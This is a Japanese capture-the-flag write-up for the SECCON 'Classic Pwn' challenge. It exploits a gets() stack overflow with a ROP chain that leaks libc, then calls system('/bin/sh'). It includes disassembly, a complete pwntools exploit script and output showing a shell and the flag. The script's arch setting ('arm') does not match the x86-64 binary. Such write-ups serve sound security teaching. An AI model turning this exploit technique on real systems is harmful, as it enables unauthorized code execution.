# Classic Pwm
古典的な？Return Oriented Programmingの問題だった。少し時間がかかったが、なんとか解くことができた。

## Problem
Host: classic.pwn.seccon.jp  
Port: 17354  

## 回答
問題文では、実行ファイルとlibcが与えられている。
````
$ file classic_aa9e979fd5c597526ef30c003bffee474b314e22 
classic_aa9e979fd5c597526ef30c003bffee474b314e22: ELF 64-bit LSB executable, 
x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
for GNU/Linux 2.6.32, BuildID[sha1]=a8a02d460f97f6ff0fb4711f5eb207d4a1b41ed8, not stripped
````

セキュリティ機構チェック
````
$ checksec.sh --file classic_aa9e979fd5c597526ef30c003bffee474b314e22 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   classic_aa9e979fd5c597526ef30c003bffee474b314e22
````
NXビットが立っていて、カナリアがないためROPで攻略可能な問題かもしれない。  
実行してみるとユーザの入力を求められるため、長めの入力を入れてみるとセグフォが発生した。  
````
$ ./classic_aa9e979fd5c597526ef30c003bffee474b314e22 
Classic Pwnable Challenge
Local Buffer >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Have a nice pwn!!
Segmentation fault (core dumped)
````

main関数の逆アセンブリ結果  
````
gdb-peda$ pdis main
Dump of assembler code for function main:
   0x00000000004006a9 <+0>:	push   rbp
   0x00000000004006aa <+1>:	mov    rbp,rsp
   0x00000000004006ad <+4>:	sub    rsp,0x40
   0x00000000004006b1 <+8>:	mov    edi,0x400774
   0x00000000004006b6 <+13>:	call   0x400520 <puts@plt>
   0x00000000004006bb <+18>:	mov    edi,0x40078e
   0x00000000004006c0 <+23>:	mov    eax,0x0
   0x00000000004006c5 <+28>:	call   0x400540 <printf@plt>
   0x00000000004006ca <+33>:	lea    rax,[rbp-0x40]
   0x00000000004006ce <+37>:	mov    rdi,rax
   0x00000000004006d1 <+40>:	call   0x400560 <gets@plt>
   0x00000000004006d6 <+45>:	mov    edi,0x40079f
   0x00000000004006db <+50>:	call   0x400520 <puts@plt>
   0x00000000004006e0 <+55>:	mov    eax,0x0
   0x00000000004006e5 <+60>:	leave  
   0x00000000004006e6 <+61>:	ret    
End of assembler dump.
````
ユーザ入力にgetsを使用しているため簡単にBOFすることがわかった。  
カナリアもないので、ROPによりlibcの関数のアドレスをリークさせて、ripをmainの先頭に戻し、2回目の入力でsystem("/bin/sh")を呼び出してやればよさそう。

## スクリプト
上記の方針をもとに作成したスクリプト  
無事シェルをとってフラグを取得できた。

````python
# -*- coding: utf-8 -*-

from pwn import *

context(arch='arm', os='linux')
main = ELF('./classic_aa9e979fd5c597526ef30c003bffee474b314e22')
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

# address
addr_main = main.symbols['main'] # 0x4006a9
plt_puts = main.symbols['puts'] # 0x400520
got_gets = 0x601038 #objdump -d -j .plt <filename>
offset_libc_gets = libc.symbols['gets']

# rop gadgets
pop_rdi = 0x400753

#con = remote('localhost', 17354)
con = remote('classic.pwn.seccon.jp', 17354)

con.recvuntil('Local Buffer >> ')

# leak libc function address
buf = 'A' * 72 # padding
buf += p64(pop_rdi)
buf += p64(got_gets)
buf += p64(plt_puts)
buf += p64(addr_main)

con.sendline(buf)
con.recvuntil('pwn!!\n')
libc_gets = u64(con.recv(6) + '\x00\x00')
libc_base = libc_gets - offset_libc_gets
offset_libc_system = libc.symbols['system']
libc_system = libc_base + offset_libc_system
bin_sh = next(libc.search('/bin/sh')) + libc_base

print "libc_base   : {}".format(hex(libc_base))
print "libc_gets   : {}".format(hex(libc_gets))
print "libc_system : {}".format(hex(libc_system))
print "/bin/sh     : {}".format(hex(bin_sh))

con.recvuntil('Local Buffer >> ')

# call system("/bin/sh")
buf = 'A' * 72
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(libc_system)
con.sendline(buf)
con.recv(1024)

con.interactive()
````

````
$ python solve.py 
[*] './classic_aa9e979fd5c597526ef30c003bffee474b314e22'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to classic.pwn.seccon.jp on port 17354: Done
libc_base   : 0x7fb08c9a0000
libc_gets   : 0x7fb08ca0ed80
libc_system : 0x7fb08c9e5390
/bin/sh     : 0x7fb08cb2cd57
[*] Switching to interactive mode

$ ls
classic
flag.txt
$ cat flag.txt
SECCON{w4rm1ng_up_by_7r4d1710n4l_73chn1qu3}
````
